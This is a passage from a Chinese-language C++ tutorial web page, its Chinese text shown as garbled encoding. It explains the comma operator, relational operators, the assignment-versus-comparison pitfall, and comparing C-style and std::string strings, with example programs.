<span class="string">&quot;, b=&quot;</span> &lt;&lt; b &lt;&lt; <span class="string">&quot;, c=&quot;</span> &lt;&lt; c &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// è¾“å‡º value=1, a=2, b=4, c=7</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// å¦‚æœæƒ³æŒ‰é¡ºåºæ‰§è¡Œå¹¶å–æœ€åç»“æœï¼Œéœ€è¦æ‹¬å·</span></span><br><span class="line">    value = (++a, b += a, c += b); <span class="comment">// a=3, b=4+3=7, c=7+7=14. value=14</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;value=&quot;</span> &lt;&lt; value &lt;&lt; <span class="string">&quot;, a=&quot;</span> &lt;&lt; a &lt;&lt; <span class="string">&quot;, b=&quot;</span> &lt;&lt; b &lt;&lt; <span class="string">&quot;, c=&quot;</span> &lt;&lt; c &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// è¾“å‡º value=14, a=3, b=7, c=14</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è™½ç„¶é€—å·è¿ç®—ç¬¦æä¾›äº†è¿™ç§èƒ½åŠ›ï¼Œä½†è¿‡åº¦ä½¿ç”¨å¯èƒ½é™ä½ä»£ç çš„å¯è¯»æ€§ã€‚åœ¨ <code>for</code> å¾ªç¯çš„åˆå§‹åŒ–å’Œæ›´æ–°éƒ¨åˆ†æ˜¯å…¶æœ€å¸¸è§ä¸”åˆç†çš„ç”¨é€”ã€‚</p><h3 id="5-1-12-å…³ç³»è¡¨è¾¾å¼"><a href="#5-1-12-å…³ç³»è¡¨è¾¾å¼" class="headerlink" title="5.1.12 å…³ç³»è¡¨è¾¾å¼"></a>5.1.12 å…³ç³»è¡¨è¾¾å¼</h3><p><strong>å…³ç³»è¡¨è¾¾å¼ (Relational Expression)</strong> ä½¿ç”¨å…³ç³»è¿ç®—ç¬¦æ¥æ¯”è¾ƒä¸¤ä¸ªæ“ä½œæ•°çš„å€¼ï¼Œå…¶ç»“æœæ˜¯ä¸€ä¸ªå¸ƒå°”å€¼ (<code>true</code> æˆ– <code>false</code>)ã€‚</p><p><strong>å…³ç³»è¿ç®—ç¬¦:</strong></p><ul><li>  <code>&lt;</code> : å°äº (Less than)</li><li>  <code>&gt;</code> : å¤§äº (Greater than)</li><li>  <code>&lt;=</code>: å°äºæˆ–ç­‰äº (Less than or equal to)</li><li>  <code>&gt;=</code>: å¤§äºæˆ–ç­‰äº (Greater than or equal to)</li><li>  <code>==</code>: ç­‰äº (Equal to)</li><li>  <code>!=</code>: ä¸ç­‰äº (Not equal to)</li></ul><p>è¿™äº›è¿ç®—ç¬¦çš„ä¼˜å…ˆçº§ä½äºç®—æœ¯è¿ç®—ç¬¦ï¼Œä½†é«˜äºèµ‹å€¼è¿ç®—ç¬¦ã€‚<code>==</code> å’Œ <code>!=</code> çš„ä¼˜å…ˆçº§ä½äºå…¶ä»–å››ä¸ªå…³ç³»è¿ç®—ç¬¦ã€‚</p><p><strong>ç”¨æ³•ä¸ç¤ºä¾‹:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> score = <span class="number">85</span>;</span><br><span class="line">    <span class="keyword">int</span> passing_score = <span class="number">60</span>;</span><br><span class="line">    <span class="keyword">double</span> temp1 = <span class="number">36.5</span>, temp2 = <span class="number">37.0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">bool</span> isPassing = (score &gt;= passing_score); <span class="comment">// æ¯”è¾ƒ score æ˜¯å¦å¤§äºç­‰äº passing_score</span></span><br><span class="line">    <span class="keyword">bool</span> isFever = (temp1 &gt; temp2);          <span class="comment">// æ¯”è¾ƒ temp1 æ˜¯å¦å¤§äº temp2</span></span><br><span class="line">    <span class="keyword">bool</span> isEqual = (score == <span class="number">85</span>);            <span class="comment">// æ¯”è¾ƒ score æ˜¯å¦ç­‰äº 85</span></span><br><span class="line">    <span class="keyword">bool</span> isNotEqual = (temp1 != temp2);      <span class="comment">// æ¯”è¾ƒ temp1 æ˜¯å¦ä¸ç­‰äº temp2</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="built_in">std</span>::boolalpha; <span class="comment">// ä½¿ bool è¾“å‡ºä¸º true/false</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Score: &quot;</span> &lt;&lt; score &lt;&lt; <span class="string">&quot;, Passing Score: &quot;</span> &lt;&lt; passing_score &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Is passing? &quot;</span> &lt;&lt; isPassing &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;   <span class="comment">// è¾“å‡º true</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Is fever? &quot;</span> &lt;&lt; isFever &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;     <span class="comment">// è¾“å‡º false</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Is score 85? &quot;</span> &lt;&lt; isEqual &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;    <span class="comment">// è¾“å‡º true</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Temps not equal? &quot;</span> &lt;&lt; isNotEqual &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// è¾“å‡º true</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// åœ¨å¾ªç¯æ¡ä»¶ä¸­ä½¿ç”¨</span></span><br><span class="line">    <span class="keyword">int</span> count = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> (count &lt; <span class="number">3</span>) &#123; <span class="comment">// å½“ count å°äº 3 æ—¶å¾ªç¯</span></span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Count is &quot;</span> &lt;&lt; count &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">        count++;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="5-1-13-èµ‹å€¼ã€æ¯”è¾ƒå’Œå¯èƒ½çŠ¯çš„é”™è¯¯"><a href="#5-1-13-èµ‹å€¼ã€æ¯”è¾ƒå’Œå¯èƒ½çŠ¯çš„é”™è¯¯" class="headerlink" title="5.1.13 èµ‹å€¼ã€æ¯”è¾ƒå’Œå¯èƒ½çŠ¯çš„é”™è¯¯"></a>5.1.13 èµ‹å€¼ã€æ¯”è¾ƒå’Œå¯èƒ½çŠ¯çš„é”™è¯¯</h3><p>ä¸€ä¸ªéå¸¸å¸¸è§çš„ C++ ç¼–ç¨‹é”™è¯¯æ˜¯å°†<strong>èµ‹å€¼è¿ç®—ç¬¦ (<code>=</code>)</strong> è¯¯ç”¨åœ¨éœ€è¦<strong>æ¯”è¾ƒè¿ç®—ç¬¦ (<code>==</code>)</strong> çš„åœ°æ–¹ï¼Œå°¤å…¶æ˜¯åœ¨ <code>if</code> æˆ– <code>while</code> çš„æ¡ä»¶è¯­å¥ä¸­ã€‚</p><ul><li><p><code>if (x = 5)</code>: è¿™ä¸æ˜¯æ¯”è¾ƒ <code>x</code> æ˜¯å¦ç­‰äº 5ã€‚å®ƒçš„ä½œç”¨æ˜¯ï¼š</p><ol><li> å°† 5 èµ‹ç»™å˜é‡ <code>x</code>ã€‚</li><li> æ•´ä¸ªèµ‹å€¼è¡¨è¾¾å¼ <code>(x = 5)</code> çš„ç»“æœæ˜¯èµ‹ç»™ <code>x</code> çš„å€¼ï¼Œå³ 5ã€‚</li><li>åœ¨ <code>if</code> æ¡ä»¶ä¸­ï¼Œéé›¶å€¼è¢«è§†ä¸º <code>true</code>ã€‚<br>å› æ­¤ï¼Œè¿™ä¸ª <code>if</code> è¯­å¥<strong>æ€»æ˜¯</strong>ä¼šæ‰§è¡Œå…¶ä»£ç å—ï¼ˆé™¤é 5 è¢«è§†ä¸º falseï¼Œè¿™åœ¨ C++ ä¸­ä¸ä¼šå‘ç”Ÿï¼‰ï¼Œå¹¶ä¸”è¿˜ä¼šæ„å¤–åœ°å°† <code>x</code> çš„å€¼ä¿®æ”¹ä¸º 5ã€‚</li></ol></li><li><p>  <code>if (x == 5)</code>: è¿™æ‰æ˜¯æ­£ç¡®çš„æ¯”è¾ƒï¼Œæ£€æŸ¥ <code>x</code> çš„å½“å‰å€¼æ˜¯å¦ç­‰äº 5ï¼Œç»“æœä¸º <code>true</code> æˆ– <code>false</code>ï¼Œå¹¶ä¸”<strong>ä¸ä¼š</strong>ä¿®æ”¹ <code>x</code> çš„å€¼ã€‚</p></li></ul><p><strong>ç¤ºä¾‹:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> score = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Enter your score: &quot;</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cin</span> &gt;&gt; score;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// é”™è¯¯: ä½¿ç”¨äº†èµ‹å€¼ =</span></span><br><span class="line">    <span class="keyword">if</span> (score = <span class="number">100</span>) &#123; <span class="comment">// æ€»æ˜¯ trueï¼Œå¹¶ä¸” score è¢«æ”¹ä¸º 100</span></span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Mistake: You entered 100 (or maybe not, score is now 100).&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Mistake: This part will likely never execute.&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Score after mistaken if: &quot;</span> &lt;&lt; score &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// score æ€»æ˜¯ 100</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// æ­£ç¡®: ä½¿ç”¨äº†æ¯”è¾ƒ ==</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;\nEnter your score again: &quot;</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cin</span> &gt;&gt; score;</span><br><span class="line">    <span class="keyword">if</span> (score == <span class="number">100</span>) &#123; <span class="comment">// æ­£ç¡®æ¯”è¾ƒ</span></span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Correct: Perfect score!&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Correct: Score is not 100.&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Score after correct if: &quot;</span> &lt;&lt; score &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// score ä¿æŒç”¨æˆ·è¾“å…¥çš„å€¼</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>å¦‚ä½•é¿å…:</strong></p><ul><li>  ä»”ç»†æ£€æŸ¥æ¡ä»¶è¯­å¥ä¸­çš„ <code>=</code> å’Œ <code>==</code>ã€‚</li><li>  ä¸€äº›ç¼–ç é£æ ¼å»ºè®®å°†å¸¸é‡æ”¾åœ¨æ¯”è¾ƒè¿ç®—ç¬¦çš„å·¦è¾¹ï¼ˆâ€Yoda conditionsâ€ï¼‰ï¼Œä¾‹å¦‚ <code>if (100 == score)</code>ã€‚è¿™æ ·å¦‚æœæ„å¤–å†™æˆ <code>if (100 = score)</code>ï¼Œç¼–è¯‘å™¨ä¼šæŠ¥é”™ï¼Œå› ä¸ºä¸èƒ½ç»™å¸¸é‡èµ‹å€¼ã€‚</li></ul><h3 id="5-1-14-Cé£æ ¼å­—ç¬¦ä¸²çš„æ¯”è¾ƒ"><a href="#5-1-14-Cé£æ ¼å­—ç¬¦ä¸²çš„æ¯”è¾ƒ" class="headerlink" title="5.1.14 Cé£æ ¼å­—ç¬¦ä¸²çš„æ¯”è¾ƒ"></a>5.1.14 Cé£æ ¼å­—ç¬¦ä¸²çš„æ¯”è¾ƒ</h3><p>å¯¹äº C é£æ ¼å­—ç¬¦ä¸²ï¼ˆ<code>char</code> æ•°ç»„æˆ– <code>char*</code> æŒ‡é’ˆï¼‰ï¼Œ<strong>ä¸èƒ½</strong>ç›´æ¥ä½¿ç”¨å…³ç³»è¿ç®—ç¬¦ï¼ˆ<code>==</code>, <code>!=</code>, <code>&lt;</code>, <code>&gt;</code> ç­‰ï¼‰æ¥æ¯”è¾ƒå­—ç¬¦ä¸²çš„<strong>å†…å®¹</strong>ã€‚</p><p>å½“å¯¹ä¸¤ä¸ª <code>char*</code> æŒ‡é’ˆä½¿ç”¨ <code>==</code> æˆ– <code>!=</code> æ—¶ï¼Œæ¯”è¾ƒçš„æ˜¯æŒ‡é’ˆå­˜å‚¨çš„<strong>å†…å­˜åœ°å€</strong>ï¼Œè€Œä¸æ˜¯å®ƒä»¬æŒ‡å‘çš„å­—ç¬¦ä¸²å†…å®¹ã€‚</p><p>è¦æ¯”è¾ƒ C é£æ ¼å­—ç¬¦ä¸²çš„å†…å®¹ï¼Œéœ€è¦ä½¿ç”¨ C å­—ç¬¦ä¸²åº“ <code>&lt;cstring&gt;</code> (æˆ– C çš„ <code>&lt;string.h&gt;</code>) ä¸­æä¾›çš„å‡½æ•°ï¼Œä¸»è¦æ˜¯ <code>strcmp()</code>ã€‚</p><ul><li><code>strcmp(str1, str2)</code>:<ul><li>  å¦‚æœ <code>str1</code> æŒ‰å­—å…¸åºç­‰äº <code>str2</code>ï¼Œè¿”å› 0ã€‚</li><li>  å¦‚æœ <code>str1</code> å°äº <code>str2</code>ï¼Œè¿”å›è´Ÿå€¼ã€‚</li><li>  å¦‚æœ <code>str1</code> å¤§äº <code>str2</code>ï¼Œè¿”å›æ­£å€¼ã€‚</li></ul></li></ul><p><strong>ç”¨æ³•ä¸ç¤ºä¾‹:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstring&gt; // ä¸ºäº† strcmp()</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">char</span> word1[] = <span class="string">&quot;apple&quot;</span>;</span><br><span class="line">    <span class="keyword">char</span> word2[] = <span class="string">&quot;apply&quot;</span>;</span><br><span class="line">    <span class="keyword">char</span> word3[] = <span class="string">&quot;apple&quot;</span>;</span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">char</span> *p1 = <span class="string">&quot;banana&quot;</span>;</span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">char</span> *p2 = <span class="string">&quot;banana&quot;</span>; <span class="comment">// ç¼–è¯‘å™¨å¯èƒ½å°†ç›¸åŒçš„å­—é¢å€¼å­˜å‚¨åœ¨åŒä¸€åœ°å€</span></span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">char</span> *p3 = word1;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// é”™è¯¯: æ¯”è¾ƒåœ°å€</span></span><br><span class="line">    <span class="keyword">if</span> (word1 == word3) &#123; <span class="comment">// æ¯”è¾ƒä¸¤ä¸ªä¸åŒæ•°ç»„çš„åœ°å€ï¼Œç»“æœé€šå¸¸æ˜¯ false</span></span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Mistake: word1 == word3 (comparing addresses)&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Mistake: word1 != word3 (comparing addresses)&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (p1 == p2) &#123; <span class="comment">// å¯èƒ½ true (å¦‚æœç¼–è¯‘å™¨ä¼˜åŒ–)ï¼Œä¹Ÿå¯èƒ½ false</span></span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Info: p1 == p2 (compiler might optimize literals)&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">         <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Info: p1 != p2 (compiler might not optimize literals)&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (p3 == word1) &#123; <span class="comment">// true, p3 æŒ‡å‘ word1 çš„èµ·å§‹åœ°å€</span></span><br><span class="line">         <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Info: p3 == word1 (same address)&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// æ­£ç¡®: ä½¿ç”¨ strcmp() æ¯”è¾ƒå†…å®¹</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">strcmp</span>(word1, word3) == <span class="number">0</span>) &#123; <span class="comment">// æ¯”è¾ƒå†…å®¹æ˜¯å¦ç›¸ç­‰</span></span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Correct: strcmp(word1, word3) == 0 (contents are equal)&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Correct: strcmp(word1, word3) != 0&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">strcmp</span>(word1, word2) &lt; <span class="number">0</span>) &#123; <span class="comment">// æ¯”è¾ƒ word1 æ˜¯å¦å°äº word2</span></span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Correct: strcmp(word1, word2) &lt; 0 (\&quot;apple\&quot; &lt; \&quot;apply\&quot;)&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="5-1-15-æ¯”è¾ƒstringç±»å­—ç¬¦ä¸²"><a href="#5-1-15-æ¯”è¾ƒstringç±»å­—ç¬¦ä¸²" class="headerlink" title="5.1.15 æ¯”è¾ƒstringç±»å­—ç¬¦ä¸²"></a>5.1.15 æ¯”è¾ƒstringç±»å­—ç¬¦ä¸²</h3><p>ä¸ C é£æ ¼å­—ç¬¦ä¸²ä¸åŒï¼ŒC++ çš„ <code>std::string</code> ç±»<strong>é‡è½½</strong>äº†æ‰€æœ‰çš„å…³ç³»è¿ç®—ç¬¦ï¼ˆ<code>==</code>, <code>!=</code>, <code>&lt;</code>, <code>&gt;</code>, <code>&lt;=</code>, <code>&gt;=</code>ï¼‰ã€‚</p><p>è¿™æ„å‘³ç€ä½ å¯ä»¥ç›´æ¥ä½¿ç”¨è¿™äº›è¿ç®—ç¬¦æ¥æ¯”è¾ƒä¸¤ä¸ª <code>std::string</code> å¯¹è±¡çš„<strong>å†…å®¹</strong>ï¼ˆæŒ‰å­—å…¸åºè¿›è¡Œæ¯”è¾ƒï¼‰ã€‚</p><p><strong>ç”¨æ³•ä¸ç¤ºä¾‹:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">string</span> s1 = <span class="string">&quot;apple&quot;</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">string</span> s2 = <span class="string">&quot;apply&quot;</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">string</span> s3 = <span class="string">&quot;apple&quot;</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">string</span> s4 = <span class="string">&quot;Banana&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ç›´æ¥ä½¿ç”¨ == æ¯”è¾ƒå†…å®¹</span></span><br><span class="line">    <span class="keyword">if</span> (s1 == s3) &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;s1 == s3 is true (contents are equal)&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;s1 == s3 is false&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ç›´æ¥ä½¿ç”¨ !=</span></span><br><span class="line">    <span class="keyword">if</span> (s1 != s2) &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;s1 != s2 is true&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;s1 != s2 is false&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ç›´æ¥ä½¿ç”¨ &lt;, &gt; ç­‰è¿›è¡Œå­—å…¸åºæ¯”è¾ƒ</span></span><br><span class="line">    <span class="keyword">if</span> (s1 &lt; s2) &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;s1 &lt; s2 is true (\&quot;apple\&quot; &lt; \&quot;apply\&quot;)&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (s1 &lt; s4) &#123; <span class="comment">// æ¯”è¾ƒ &quot;apple&quot; å’Œ &quot;Banana&quot;</span></span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;s1 &lt; s4 is true (\&quot;apple\&quot; &gt; \&quot;Banana\&quot; due to case)&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; </span><br><span class="line">        <span class="comment">// æ³¨æ„ï¼šæ¯”è¾ƒæ˜¯åŒºåˆ†å¤§å°å†™çš„ï¼Œ&#x27;a&#x27; çš„ ASCII å€¼å¤§äº &#x27;B&#x27;</span></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">         <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;s1 &lt; s4 is false (\&quot;apple\&quot; &gt; \&quot;Banana\&quot; due to case)&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ä¹Ÿå¯ä»¥å’Œ C é£æ ¼å­—ç¬¦ä¸²å­—é¢å€¼æ¯”è¾ƒ</span></span><br><span class="line">    <span class="keyword">if</span> (s1 == <span class="string">&quot;apple&quot;</span>) &#123;</span><br><span class="line">         <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;s1 == \&quot;apple\&quot; is true&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä½¿ç”¨ <code>std::string</code> 